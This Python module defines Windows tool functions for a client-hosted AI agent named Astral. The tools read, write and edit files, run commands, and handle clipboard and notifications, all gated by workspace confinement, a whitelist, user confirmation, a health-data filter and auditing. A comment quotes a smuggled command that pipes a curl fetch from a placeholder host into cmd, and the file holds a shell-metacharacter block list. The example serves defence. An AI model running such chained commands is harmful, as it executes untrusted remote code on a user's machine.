"""Windows-specific tool functions for the client-hosted agent.

Each returns ``{"_ui_components": [<astralprims dicts>], "_data": {...}}`` — the
same shape backend agents return — so results render natively in the desktop
client (and as HTML on the web). These execute on the host the agent runs on.

The coding tools (read_file / write_file / edit_file / run_command / run_shell)
are **workspace-confined**, **per-tool permission-gated** (by the orchestrator's
ToolPermissionManager via the declared scope), **PHI-gated client-side**
(fail-closed — PHI never leaves the machine), and **audited** on every action
(local hash-chained JSONL + the orchestrator's own tool audit event).
"""

from __future__ import annotations

import os
import platform
import shlex
import subprocess
from typing import Any, Dict, List, Optional

# Client-side PHI pre-filter + audit log (fail-closed / fail-open respectively).
# Imported lazily-safe: these modules live alongside the agent in the bundle.
from astral_client import audit_log, phi_gate


# --------------------------------------------------------------------------- #
# Per-action confirmation gate (feature 039 UX).
#
# Mutating/exec tools ask the user for an explicit Allow before touching disk
# or running a command. The real bridge (astral_client.confirm) shows a native
# Qt dialog on the GUI thread. When the bridge is not attached (headless agent
# run, or a test that hasn't stubbed it), the default is FAIL-CLOSED: deny.
# Tests monkeypatch ``_confirm_action`` to auto-allow so the existing pure-
# Python suite stays green without a Qt display.
# --------------------------------------------------------------------------- #
def _confirm_action(
    *,
    tool: str,
    path: str = "",
    command: str = "",
    preview: str = "",
    summary: str = "",
    dangerous: bool = False,
) -> bool:
    try:
        from astral_client import confirm as _c
    except Exception:  # noqa: BLE001 — confirm module optional in minimal envs
        return False  # fail-closed: no GUI bridge => no mutating action
    return _c.confirm_action(
        tool=tool, path=path, command=command, preview=preview, summary=summary
    )


def _alert(message: str, variant: str = "success", title: str = None) -> dict:
    a = {"type": "alert", "variant": variant, "message": message}
    if title:
        a["title"] = title
    return a


# --------------------------------------------------------------------------- #
# Per-dispatch context (set by agent.dispatch before invoking a tool).
# Holds the actor (from the token), the MCP request's correlation_id, and the
# AuditLogger. Existing tools ignore it; the coding tools use it for audit.
# --------------------------------------------------------------------------- #
_CTX: Dict[str, Any] = {"actor": "unknown", "correlation_id": "", "audit": None}


def set_context(
    *,
    actor: str = "unknown",
    correlation_id: str = "",
    audit: Optional[audit_log.AuditLogger] = None,
) -> None:
    _CTX["actor"] = actor or "unknown"
    _CTX["correlation_id"] = correlation_id or ""
    _CTX["audit"] = audit


def _audit(
    tool: str, args: Any, outcome: str, *, event_class: str = "tool", detail: str = ""
) -> None:
    al = _CTX.get("audit")
    if al is not None:
        al.record(
            tool=tool,
            args=args,
            outcome=outcome,
            correlation_id=_CTX.get("correlation_id") or "",
            event_class=event_class,
            detail=detail,
        )


# --------------------------------------------------------------------------- #
# Workspace confinement — the primary filesystem safety boundary.
# --------------------------------------------------------------------------- #
# In-process override set by the desktop GUI (the user's chosen workspace
# folder). Wins over the env var so a runtime directory change takes effect
# immediately. None => fall back to ASTRAL_WORKSPACE_DIR (the launch default).
_WORKSPACE_OVERRIDE: Optional[str] = None


def set_workspace_override(path: Optional[str]) -> None:
    """Set (or clear) the in-process workspace root used by every file/command
    tool. Called by the desktop GUI when the user picks/changes the folder."""
    global _WORKSPACE_OVERRIDE
    if not path:
        _WORKSPACE_OVERRIDE = None
        return
    _WORKSPACE_OVERRIDE = os.path.realpath(os.path.expanduser(os.path.expandvars(path)))


def workspace_root() -> str:
    if _WORKSPACE_OVERRIDE is not None:
        return _WORKSPACE_OVERRIDE
    return os.path.realpath(
        os.path.expanduser(
            os.path.expandvars(
                os.getenv("ASTRAL_WORKSPACE_DIR", os.path.join("~", "AstralWorkspace"))
            )
        )
    )


def _ensure_workspace() -> str:
    root = workspace_root()
    os.makedirs(root, exist_ok=True)
    return root


def _confined(path: str) -> Optional[str]:
    """Resolve ``path`` and return its realpath iff inside the workspace, else None.

    Refuses traversal (``..``), absolute paths outside the workspace, and symlink
    escape (realpath resolves symlinks before the prefix check).
    """
    if not path:
        return None
    root = workspace_root()
    try:
        rp = os.path.realpath(
            os.path.join(root, os.path.expandvars(os.path.expanduser(path)))
        )
    except Exception:  # noqa: BLE001
        return None
    if rp == root or rp.startswith(root + os.sep):
        return rp
    return None


# --------------------------------------------------------------------------- #
# Coding tools
# --------------------------------------------------------------------------- #

_READ_CAP = int(os.getenv("WIN_READ_MAX_BYTES", str(2 * 1024 * 1024)))  # 2 MB


def read_file(path: str = "", **kwargs) -> Dict[str, Any]:
    """Read a text file inside the workspace (PHI-gated before return)."""
    args = {"path": path}
    rp = _confined(path)
    if rp is None or not os.path.isfile(rp):
        _audit("read_file", args, "refused", detail="outside workspace or not a file")
        return _ok(
            [
                _alert(
                    "That file isn't inside your Astral workspace "
                    "(or doesn't exist). I can only read files there.",
                    "error",
                )
            ]
        )
    try:
        with open(rp, "r", encoding="utf-8", errors="replace") as f:
            text = f.read(_READ_CAP)
        if phi_gate.looks_like_phi(text):
            _audit(
                "read_file", args, "phi_blocked", detail="PHI detected; not returned"
            )
            return _ok(
                [
                    _alert(
                        "That file appears to contain protected health "
                        "information. For safety I won't read or send it.",
                        "error",
                    )
                ]
            )
        _audit("read_file", args, "success")
        return _ok(
            [
                {
                    "type": "card",
                    "title": os.path.relpath(rp, workspace_root()),
                    "content": [{"type": "code", "code": text, "language": _lang(rp)}],
                }
            ],
            {"path": rp, "length": len(text)},
        )
    except Exception as exc:  # noqa: BLE001
        _audit("read_file", args, "error", detail=str(exc))
        return _ok([_alert(f"Couldn't read the file: {exc}", "error")])


def write_file(path: str = "", content: str = "", **kwargs) -> Dict[str, Any]:
    """Create or overwrite a file inside the workspace."""
    args = {"path": path, "length": len(content or "")}
    rp = _confined(path)
    if rp is None:
        _audit("write_file", args, "refused", detail="outside workspace")
        return _ok(
            [_alert("I can only write files inside your Astral workspace.", "error")]
        )
    # Per-action confirmation: show the path + content, require an explicit Allow.
    if not _confirm_action(
        tool="write_file",
        path=os.path.relpath(rp, workspace_root()),
        preview=content or "",
        summary="Astral wants to create/overwrite this file:",
    ):
        _audit("write_file", args, "user_denied", detail="user denied the write")
        return _ok(
            [_alert("You chose not to write that file — nothing was changed.", "info")]
        )
    try:
        os.makedirs(os.path.dirname(rp), exist_ok=True)
        with open(rp, "w", encoding="utf-8") as f:
            f.write(content or "")
        _audit("write_file", args, "success")
        return _ok(
            [
                _alert(
                    f"Wrote {len(content or '')} characters to "
                    f"{os.path.relpath(rp, workspace_root())}.",
                    "success",
                    "File saved",
                )
            ],
            {"path": rp, "length": len(content or "")},
        )
    except Exception as exc:  # noqa: BLE001
        _audit("write_file", args, "error", detail=str(exc))
        return _ok([_alert(f"Couldn't write the file: {exc}", "error")])


def edit_file(path: str = "", old: str = "", new: str = "", **kwargs) -> Dict[str, Any]:
    """Replace the first occurrence of ``old`` with ``new`` in a workspace file."""
    args = {"path": path, "old_len": len(old or ""), "new_len": len(new or "")}
    if not old:
        _audit("edit_file", args, "refused", detail="empty old text")
        return _ok([_alert("Tell me the exact text to replace.", "warning")])
    rp = _confined(path)
    if rp is None or not os.path.isfile(rp):
        _audit("edit_file", args, "refused", detail="outside workspace or missing")
        return _ok(
            [
                _alert(
                    "That file isn't inside your workspace (or doesn't exist).", "error"
                )
            ]
        )
    try:
        with open(rp, "r", encoding="utf-8", errors="replace") as f:
            text = f.read()
        if old not in text:
            _audit("edit_file", args, "refused", detail="old text not found")
            return _ok(
                [
                    _alert(
                        "I couldn't find that exact text in the file — "
                        "nothing was changed.",
                        "warning",
                    )
                ]
            )
        count = text.count(old)
        # Per-action confirmation: show the exact old → new edit before applying.
        preview = f"--- find ---\n{old}\n\n+++ replace with ---\n{new or ''}"
        if not _confirm_action(
            tool="edit_file",
            path=os.path.relpath(rp, workspace_root()),
            preview=preview,
            summary="Astral wants to edit this file:",
        ):
            _audit("edit_file", args, "user_denied", detail="user denied the edit")
            return _ok(
                [
                    _alert(
                        "You chose not to edit that file — nothing was changed.", "info"
                    )
                ]
            )
        text = text.replace(old, new or "", 1)
        with open(rp, "w", encoding="utf-8") as f:
            f.write(text)
        _audit(
            "edit_file",
            args,
            "success",
            detail=f"{count} match(es) present; replaced first",
        )
        return _ok(
            [
                _alert(
                    f"Edited {os.path.relpath(rp, workspace_root())} "
                    f"(1 of {count} match replaced).",
                    "success",
                    "File edited",
                )
            ],
            {"path": rp, "matches": count},
        )
    except Exception as exc:  # noqa: BLE001
        _audit("edit_file", args, "error", detail=str(exc))
        return _ok([_alert(f"Couldn't edit the file: {exc}", "error")])


# Whitelist of executables permitted for run_command (inside the workspace).
# Anything else is refused unless the dangerous bypass (run_shell) is enabled.
_CMD_WHITELIST = {
    "git",
    "python",
    "python3",
    "py",
    "pip",
    "uv",
    "npm",
    "npx",
    "node",
    "cargo",
    "rustc",
    "go",
    "dotnet",
    "dir",
    "ls",
    "type",
    "cat",
    "echo",
    "mkdir",
    "rmdir",
    "copy",
    "del",
    "move",
    "ren",
    "test",
    "pytest",
    "ruff",
    "black",
    "mypy",
}
_CMD_TIMEOUT = int(os.getenv("WIN_CMD_TIMEOUT", "60"))
_CMD_MAX_BYTES = int(os.getenv("WIN_CMD_MAX_BYTES", str(1024 * 1024)))

# Shell metacharacters that CHAIN, REDIRECT or SUBSTITUTE another command.
# `_exec` runs through the shell (several whitelisted entries — dir/type/copy/
# del/move/ren/echo — are cmd.exe builtins with no executable to invoke), so
# the whitelist check on argv[0] alone was not a boundary: `git status && curl
# http://x | cmd` passes it as "git" and then the shell runs the rest. Anything
# carrying one of these is refused and pointed at the bypass tool, which is
# what the two-tier design intends to be the only route to arbitrary execution.
_SHELL_METACHARS = ("&", "|", ";", "<", ">", "`", "$(", "\n", "\r", "%")


def _shell_metachar(command: str) -> str:
    """The first chaining/redirecting metacharacter in ``command``, else ""."""
    for token in _SHELL_METACHARS:
        if token in command:
            return token
    return ""


def _head(s: str, n: int) -> str:
    return s if len(s) <= n else s[:n] + f"\n…[truncated {len(s) - n} chars]"


def run_command(command: str = "", **kwargs) -> Dict[str, Any]:
    """Run a whitelisted command inside the workspace (PHI-gated output)."""
    args = {"command": command}
    if not command or not command.strip():
        _audit("run_command", args, "refused", detail="empty command")
        return _ok([_alert("Give me a command to run.", "warning")])
    try:
        parts = shlex.split(command, posix=True)
    except ValueError as exc:
        _audit("run_command", args, "refused", detail=f"parse error: {exc}")
        return _ok([_alert(f"I couldn't parse that command: {exc}", "error")])
    if not parts:
        _audit("run_command", args, "refused", detail="empty after parse")
        return _ok([_alert("Give me a command to run.", "warning")])
    # Refuse shell chaining BEFORE the whitelist check: the whitelist inspects
    # argv[0] only, but `_exec` hands the whole string to the shell, so a
    # metacharacter would smuggle an arbitrary second command past a
    # whitelisted first one.
    metachar = _shell_metachar(command)
    if metachar:
        _audit("run_command", args, "refused",
               detail=f"shell metacharacter {metachar!r}")
        return _ok(
            [
                _alert(
                    f"That command chains or redirects with '{metachar}', which "
                    "I can't run here — this tool runs one allowed program at a "
                    "time. Run the steps as separate commands, or enable the "
                    "dangerous bypass for full shell access.",
                    "warning",
                )
            ]
        )
    exe = os.path.splitext(os.path.basename(parts[0]))[0].lower()
    if exe not in _CMD_WHITELIST:
        _audit("run_command", args, "refused", detail=f"non-whitelisted: {exe}")
        return _ok(
            [
                _alert(
                    f"'{exe}' isn't on the allowed list. I can run common "
                    "dev tools (git, python, pip, npm, cargo, go, …). For "
                    "anything else, enable the dangerous bypass.",
                    "warning",
                )
            ]
        )
    # Per-action confirmation: show the exact command + workspace cwd.
    if not _confirm_action(
        tool="run_command",
        command=command,
        preview=command,
        summary="Astral wants to run this command in your workspace:",
    ):
        _audit("run_command", args, "user_denied", detail="user denied the command")
        return _ok(
            [
                _alert(
                    "You chose not to run that command — nothing was executed.", "info"
                )
            ]
        )
    return _exec(command, args, cwd=workspace_root(), event_class="tool")


def run_shell(command: str = "", **kwargs) -> Dict[str, Any]:
    """DANGEROUS BYPASS — run an arbitrary shell command (full access).

    Gated behind ASTRAL_DANGEROUS_BYPASS=1 (checked by the agent before it ever
    advertises/calls this) AND a per-call native confirmation (the agent prompts
    the user with the exact command). Always audited as ``dangerous_bypass``.
    """
    args = {"command": command}
    if os.getenv("ASTRAL_DANGEROUS_BYPASS", "0") not in ("1", "true", "yes", "on"):
        _audit("run_shell", args, "refused", detail="bypass flag not set")
        return _ok(
            [
                _alert(
                    "Full shell access is disabled. Enable it in Settings "
                    "(dangerous bypass) and confirm each command.",
                    "warning",
                )
            ]
        )
    if not command or not command.strip():
        _audit("run_shell", args, "refused", detail="empty command")
        return _ok([_alert("Give me a command to run.", "warning")])
    # Per-call native confirmation — the exact command, with DANGEROUS framing.
    # This is the per-action gate the docstring has always promised.
    if not _confirm_action(
        tool="run_shell",
        command=command,
        preview=command,
        summary="DANGEROUS: Astral wants to run this with FULL shell access:",
        dangerous=True,
    ):
        _audit(
            "run_shell",
            args,
            "user_denied",
            detail="user denied the bypass command",
            event_class="dangerous_bypass",
        )
        return _ok(
            [
                _alert(
                    "You chose not to run that command — nothing was executed.", "info"
                )
            ]
        )
    # No cwd confinement for the bypass — that's the whole point. PHI still gated.
    return _exec(command, args, cwd=None, event_class="dangerous_bypass")


def _exec(
    command: str, args: dict, *, cwd: Optional[str], event_class: str
) -> Dict[str, Any]:
    try:
        proc = subprocess.run(
            command,
            shell=True,
            cwd=cwd,
            capture_output=True,
            text=True,
            timeout=_CMD_TIMEOUT,
        )
    except subprocess.TimeoutExpired:
        _audit(
            "run_shell" if event_class == "dangerous_bypass" else "run_command",
            args,
            "error",
            detail="timeout",
            event_class=event_class,
        )
        return _ok(
            [
                _alert(
                    f"Command timed out after {_CMD_TIMEOUT}s and was killed.", "error"
                )
            ]
        )
    except Exception as exc:  # noqa: BLE001
        _audit(
            "run_shell" if event_class == "dangerous_bypass" else "run_command",
            args,
            "error",
            detail=str(exc),
            event_class=event_class,
        )
        return _ok([_alert(f"Couldn't run the command: {exc}", "error")])
    out = (proc.stdout or "") + (proc.stderr or "")
    tool = "run_shell" if event_class == "dangerous_bypass" else "run_command"
    if phi_gate.looks_like_phi(out):
        _audit(
            tool,
            args,
            "phi_blocked",
            detail="PHI in output; not returned",
            event_class=event_class,
        )
        return _ok(
            [
                _alert(
                    "The command's output appears to contain protected "
                    "health information. For safety I won't send it.",
                    "error",
                )
            ]
        )
    _audit(
        tool,
        args,
        "success",
        detail=f"rc={proc.returncode} out={len(proc.stdout or '')}B err={len(proc.stderr or '')}B",
        event_class=event_class,
    )
    body = []
    if proc.stdout:
        body.append(
            {
                "type": "code",
                "code": _head(proc.stdout, _CMD_MAX_BYTES),
                "language": "text",
            }
        )
    if proc.stderr:
        body.append(
            {
                "type": "code",
                "code": _head(proc.stderr, _CMD_MAX_BYTES),
                "language": "text",
            }
        )
    if not body:
        body.append({"type": "text", "content": "(no output)", "variant": "markdown"})
    return _ok(
        [
            {
                "type": "card",
                "title": f"$ {command}  (exit {proc.returncode})",
                "content": body,
            }
        ],
        {"returncode": proc.returncode},
    )


def _lang(path: str) -> str:
    ext = os.path.splitext(path)[1].lower().lstrip(".")
    return {
        "py": "python",
        "js": "javascript",
        "ts": "typescript",
        "sh": "bash",
        "ps1": "powershell",
        "json": "json",
        "md": "markdown",
    }.get(ext, "text")


def _ok(components: List[dict], data: dict = None) -> Dict[str, Any]:
    return {"_ui_components": components, "_data": data or {}}


# --------------------------------------------------------------------------- #
# system info
# --------------------------------------------------------------------------- #


def get_system_info(**kwargs) -> Dict[str, Any]:
    """Report this Windows machine's OS, CPU, memory and disk usage."""
    info = {
        "OS": f"{platform.system()} {platform.release()}",
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Hostname": platform.node(),
        "Processor": platform.processor() or "—",
        "Python": platform.python_version(),
    }
    metrics = []
    data: Dict[str, Any] = dict(info)
    try:
        import psutil

        cpu = psutil.cpu_percent(interval=0.3)
        vm = psutil.virtual_memory()
        du = psutil.disk_usage(os.path.abspath(os.sep))
        data.update(cpu_percent=cpu, mem_percent=vm.percent, disk_percent=du.percent)
        metrics = [
            {"type": "metric", "title": "CPU", "value": f"{cpu:.0f}%"},
            {
                "type": "metric",
                "title": "Memory",
                "value": f"{vm.percent:.0f}%",
                "subtitle": f"{vm.used >> 30} / {vm.total >> 30} GB",
            },
            {
                "type": "metric",
                "title": "Disk",
                "value": f"{du.percent:.0f}%",
                "subtitle": f"{du.used >> 30} / {du.total >> 30} GB",
            },
        ]
    except Exception:
        pass

    content: List[dict] = []
    if metrics:
        content.append({"type": "grid", "columns": 3, "children": metrics})
    content.append(
        {
            "type": "keyvalue",
            "title": "System",
            "items": [{"label": k, "value": str(v)} for k, v in info.items()],
        }
    )
    return _ok(
        [
            {
                "type": "hero",
                "title": "Windows System Status",
                "eyebrow": "THIS PC",
                "subtitle": info["Hostname"],
            },
            {"type": "card", "title": "Details", "content": content},
        ],
        data,
    )


# --------------------------------------------------------------------------- #
# clipboard
# --------------------------------------------------------------------------- #


def read_clipboard(**kwargs) -> Dict[str, Any]:
    """Return the current text contents of the Windows clipboard."""
    text = _clip_get()
    if not text:
        return _ok([_alert("The clipboard is empty (or holds non-text data).", "info")])
    return _ok(
        [
            {
                "type": "card",
                "title": "Clipboard",
                "content": [{"type": "code", "code": text}],
            }
        ],
        {"text": text},
    )


def write_clipboard(text: str = "", **kwargs) -> Dict[str, Any]:
    """Copy ``text`` to the Windows clipboard."""
    if not text:
        return _ok([_alert("Nothing to copy — provide text.", "warning")])
    _clip_set(text)
    return _ok(
        [
            _alert(
                f"Copied {len(text)} characters to the clipboard.",
                "success",
                "Clipboard updated",
            )
        ],
        {"length": len(text)},
    )


def _clip_get() -> str:
    try:
        import pyperclip

        return pyperclip.paste() or ""
    except Exception:
        try:  # stdlib fallback
            out = subprocess.run(
                ["powershell", "-NoProfile", "-Command", "Get-Clipboard"],
                capture_output=True,
                text=True,
                timeout=8,
            )
            return (out.stdout or "").rstrip("\n")
        except Exception:
            return ""


def _clip_set(text: str) -> None:
    try:
        import pyperclip

        pyperclip.copy(text)
        return
    except Exception:
        subprocess.run(
            ["powershell", "-NoProfile", "-Command", "Set-Clipboard", "-Value", text],
            timeout=8,
        )


# --------------------------------------------------------------------------- #
# notifications
# --------------------------------------------------------------------------- #


def notify(title: str = "AstralDeep", message: str = "", **kwargs) -> Dict[str, Any]:
    """Show a native Windows toast notification."""
    t = (title or "AstralDeep").replace("'", "")
    m = (message or "").replace("'", "")
    ps = (
        "$ErrorActionPreference='SilentlyContinue';"
        "[Windows.UI.Notifications.ToastNotificationManager,Windows.UI.Notifications,ContentType=WindowsRuntime]|Out-Null;"
        "$tpl=[Windows.UI.Notifications.ToastNotificationManager]::GetTemplateContent("
        "[Windows.UI.Notifications.ToastTemplateType]::ToastText02);"
        "$tx=$tpl.GetElementsByTagName('text');"
        f"$tx.Item(0).AppendChild($tpl.CreateTextNode('{t}'))|Out-Null;"
        f"$tx.Item(1).AppendChild($tpl.CreateTextNode('{m}'))|Out-Null;"
        "$toast=[Windows.UI.Notifications.ToastNotification]::new($tpl);"
        "[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('AstralDeep').Show($toast);"
    )
    try:
        subprocess.run(
            ["powershell", "-NoProfile", "-Command", ps],
            timeout=10,
            capture_output=True,
        )
        return _ok(
            [_alert(f"Sent a notification: “{title}”.", "success")], {"sent": True}
        )
    except Exception as exc:
        return _ok([_alert(f"Couldn't show a notification: {exc}", "error")])


# --------------------------------------------------------------------------- #
# open path / url
# --------------------------------------------------------------------------- #


def open_path(path: str = "", **kwargs) -> Dict[str, Any]:
    """Open a file, folder, or URL with its default Windows handler."""
    if not path:
        return _ok([_alert("Provide a path or URL to open.", "warning")])
    try:
        if path.startswith(("http://", "https://")):
            import webbrowser

            webbrowser.open(path)
        else:
            os.startfile(os.path.expandvars(os.path.expanduser(path)))  # noqa: S606 (Windows)
        return _ok([_alert(f"Opened: {path}", "success")], {"opened": path})
    except Exception as exc:
        return _ok([_alert(f"Couldn't open '{path}': {exc}", "error")])


# --------------------------------------------------------------------------- #
# list directory
# --------------------------------------------------------------------------- #


def list_directory(path: str = "", **kwargs) -> Dict[str, Any]:
    """List the entries of a folder inside the workspace (defaults to the workspace root)."""
    args = {"path": path}
    _ensure_workspace()
    rp = _confined(path) if path else workspace_root()
    if rp is None or not os.path.isdir(rp):
        _audit(
            "list_directory",
            args,
            "refused",
            detail="outside workspace or not a folder",
        )
        return _ok([_alert("That folder isn't inside your Astral workspace.", "error")])
    rows = []
    for name in sorted(os.listdir(rp))[:200]:
        full = os.path.join(rp, name)
        is_dir = os.path.isdir(full)
        try:
            size = "" if is_dir else f"{os.path.getsize(full):,} B"
        except OSError:
            size = ""
        rows.append(
            [("📁 " if is_dir else "📄 ") + name, "folder" if is_dir else "file", size]
        )
    _audit("list_directory", args, "success")
    return _ok(
        [
            {
                "type": "card",
                "title": f"{os.path.relpath(rp, workspace_root())}  ({len(rows)} items)",
                "content": [
                    {"type": "table", "headers": ["Name", "Type", "Size"], "rows": rows}
                ],
            }
        ],
        {"path": rp, "count": len(rows)},
    )


TOOL_REGISTRY: Dict[str, dict] = {
    "get_system_info": {
        "function": get_system_info,
        "scope": "tools:system",
        "description": "Report this Windows PC's OS, CPU, memory and disk usage.",
        "input_schema": {"type": "object", "properties": {}},
    },
    "read_clipboard": {
        "function": read_clipboard,
        "scope": "tools:system",
        "description": "Read the current text on the Windows clipboard.",
        "input_schema": {"type": "object", "properties": {}},
    },
    "write_clipboard": {
        "function": write_clipboard,
        "scope": "tools:write",
        "description": "Copy text to the Windows clipboard.",
        "input_schema": {
            "type": "object",
            "properties": {"text": {"type": "string", "description": "Text to copy"}},
            "required": ["text"],
        },
    },
    "notify": {
        "function": notify,
        "scope": "tools:write",
        "description": "Show a native Windows toast notification.",
        "input_schema": {
            "type": "object",
            "properties": {"title": {"type": "string"}, "message": {"type": "string"}},
        },
    },
    "open_path": {
        "function": open_path,
        "scope": "tools:write",
        "description": "Open a file, folder, or URL with its default Windows app.",
        "input_schema": {
            "type": "object",
            "properties": {"path": {"type": "string", "description": "Path or URL"}},
            "required": ["path"],
        },
    },
    "list_directory": {
        "function": list_directory,
        "scope": "tools:read",
        "description": "List the contents of a folder inside the Astral workspace.",
        "input_schema": {
            "type": "object",
            "properties": {
                "path": {
                    "type": "string",
                    "description": "Folder path (default: workspace root)",
                }
            },
        },
    },
    # --- coding tools (feature 039) --- #
    "read_file": {
        "function": read_file,
        "scope": "tools:read",
        "description": "Read a text file inside the Astral workspace.",
        "input_schema": {
            "type": "object",
            "properties": {
                "path": {
                    "type": "string",
                    "description": "Workspace-relative file path",
                }
            },
            "required": ["path"],
        },
    },
    "write_file": {
        "function": write_file,
        "scope": "tools:write",
        "description": "Create or overwrite a file inside the Astral workspace.",
        "input_schema": {
            "type": "object",
            "properties": {
                "path": {
                    "type": "string",
                    "description": "Workspace-relative file path",
                },
                "content": {"type": "string", "description": "File contents"},
            },
            "required": ["path", "content"],
        },
    },
    "edit_file": {
        "function": edit_file,
        "scope": "tools:write",
        "description": "Replace the first occurrence of `old` with `new` in a workspace file.",
        "input_schema": {
            "type": "object",
            "properties": {
                "path": {"type": "string"},
                "old": {"type": "string"},
                "new": {"type": "string"},
            },
            "required": ["path", "old"],
        },
    },
    "run_command": {
        "function": run_command,
        "scope": "tools:execute",
        "description": "Run a whitelisted dev command (git, python, pip, npm, cargo, "
        "go, …) inside the Astral workspace.",
        "input_schema": {
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "Command line"}
            },
            "required": ["command"],
        },
    },
    "run_shell": {
        "function": run_shell,
        "scope": "tools:execute",
        "description": "DANGEROUS: run an arbitrary shell command with full access "
        "(requires the dangerous-bypass setting + per-call confirmation).",
        "input_schema": {
            "type": "object",
            "properties": {
                "command": {"type": "string", "description": "Arbitrary command line"}
            },
            "required": ["command"],
        },
    },
}
